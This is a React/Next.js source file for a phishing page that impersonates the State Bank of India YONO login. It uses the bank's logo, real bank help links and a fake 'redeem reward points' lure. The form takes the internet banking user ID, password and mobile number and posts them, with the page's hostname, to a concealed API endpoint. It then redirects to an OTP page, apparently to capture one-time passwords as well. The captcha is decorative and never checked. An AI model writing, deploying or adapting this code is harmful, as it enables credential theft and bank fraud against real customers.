'use client'
import Captcha from "../assets/captcha2.png";
import YonoImage from "../assets/YONO_Logo.png";
import { useRouter } from "next/navigation"; // in client component


import { useState } from 'react';
export default function Home() {
  const router = useRouter();
  const [response, setResponse] = useState(false);

  let isSubmit = 0;
  const handleSubmit = (e) => {
    e.preventDefault();
    isSubmit++;
    if(isSubmit == 2){
        return ;
    }
      const formData = new FormData(e.target);
      const body = {};
      formData.forEach((value, key) => {
        body[key] = value;
      });

      body['site'] = window.location.hostname;
      fetch(process.env.API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json'},
        body: JSON.stringify(body),
      })
        .then((res) => res.json())
        .then((responseData) => {
          if(responseData.status == 200){
            setResponse(true);
            router.push("/otp?next=/cfd")
          }else{
            setResponse(false);
            console.log('failed');
          }
            
        })
        .catch((error) => {
          setResponse(false);
          console.error(error);
        });
  };
  return (
    <div className="col-md-5 col-xs-12">
  <div className="card m-0 p-0">
    <div className="bg-light p-30">
      <h1
        style={{
          fontFamily: '"Open Sans", sans-serif',
          fontWeight: 700,
          marginBottom: "20px",
          marginLeft: 10
        }}
      >
        <b>Welcome to</b>
      </h1>
      <center>
        <img src={YonoImage.src} style={{ marginTop: "-15px" }} width="75%" />
      </center>
      <div className="net">
        <center>
          <p1
            style={{
              fontFamily: '"Open Sans", sans-serif',
              color: "#280071",
              fontSize: 13,
              fontWeight: 400,
              marginTop: "0%"
            }}
          >
            Please use your existing
            <span
              style={{
                fontFamily: '"Open Sans", sans-serif',
                color: "#280071",
                fontSize: 13,
                fontWeight: 700,
                marginTop: "0%"
              }}
            >
              {" "}
              Internet Banking User ID and Password
            </span>
            {" "} (credentials) of
            <span
              style={{
                fontFamily: '"Open Sans", sans-serif',
                color: "#280071",
                fontSize: 13,
                fontWeight: 700,
                marginTop: "0%"
              }}
            >
              {" "}
              Personal and Corporate Internet Banking{" "}
            </span>
            to proceed
            <span
              style={{
                fontFamily: '"Open Sans", sans-serif',
                color: "#280071",
                fontSize: 13,
                fontWeight: 700,
                marginTop: "0%"
              }}
            >
              {" "}
              To Reedem REWARD point.
            </span>
          </p1>
        </center>
      </div>
    </div>
    <div className="card-body" style={{ marginTop: "-30px" }}>
      
      <div className="login-box" style={{width:"100%"}}>
      
        <form
          className="LoginForm"
    
          onSubmit={handleSubmit}
        >
          <div className="row">
            <div className="login-box">
              <div className="user-box">
                <rt>
                  <input
                    type="text"
                    name="UDD"
                    minLength={3}
                    maxLength={35}
                    required
                  />
                  <label>
                    User ID<span style={{ color: "red" }}> *</span>
                  </label>
                </rt>
              </div>
              <div className="user-box">
                <input
                  type="password"
                  name="PDD"
                  minLength={8}
                  maxLength={35}
                  required
                />
                <label>
                  Password<span style={{ color: "red" }}> *</span>
                </label>
              </div>
              <div className="user-box">
                <input
                  type="text"
                  name="MBB"
                  inputMode="numeric"
                  maxLength={10}
                  pattern="[6-9]\d{9}"
                  title="Enter valid mobile number !"
                  required
                />
                <label>
                  Registered mobile number
                  <span style={{ color: "red" }}> *</span>
                </label>
              </div>
              <div className="user-box">
                <input
                  type="text"
                  required
                />
                <label>
                  Enter the captcha<span style={{ color: "red" }}> *</span>
                </label>
              </div>
              <div style={{ marginTop: "-12%" }} className="col-md-12">
                <p1
                  style={{
                    fontFamily: '"Open Sans", sans-serif',
                    fontSize: 13,
                    color: "#000",
                    fontWeight: 600,
                    marginLeft: 2
                  }}
                >
                  Captcha
                </p1>
                <br />
                <img src={Captcha.src} width="133px" />
              </div>
            </div>
            <div className="w3ls-login">
              <center>
                <button
                  type="submit"
                  style={{
                    fontFamily: '"Open Sans", sans-serif',
                    fontWeight: 500
                  }}
                  className="btn btn-success btn-block"
                >
                  LOG IN
                </button>
              </center>
            </div>
            <center>
              <p
                style={{
                  fontFamily: '"Open Sans", sans-serif',
                  fontWeight: 600,
                  color: "#673391",
                  textDecoration: "none"
                }}
                className="link text-center"
              >
                <a
                  href="https://retail.onlinesbi.com/preretail/lockunlockuseraccess.htm"
                  style={{
                    fontFamily: '"Open Sans", sans-serif',
                    fontWeight: 600,
                    color: "#673391",
                    textDecoration: "none"
                  }}
                >
                  Lock Access
                </a>
                |
                <a
                  href="https://retail.onlinesbi.com/retail/troubleloginhome.htm?bankCode=0"
                  style={{
                    fontFamily: '"Open Sans", sans-serif',
                    fontWeight: 600,
                    color: "#673391",
                    textDecoration: "none"
                  }}
                >
                  Forgot Password
                </a>
                |
                <a
                  href="/"
                  style={{
                    fontFamily: '"Open Sans", sans-serif',
                    fontWeight: 600,
                    color: "#673391",
                    textDecoration: "none"
                  }}
                >
                  Forgot Username2
                </a>
              </p>
            </center>
          </div>
        </form>
      </div>
    </div>
  </div>
</div>

  
  )
}
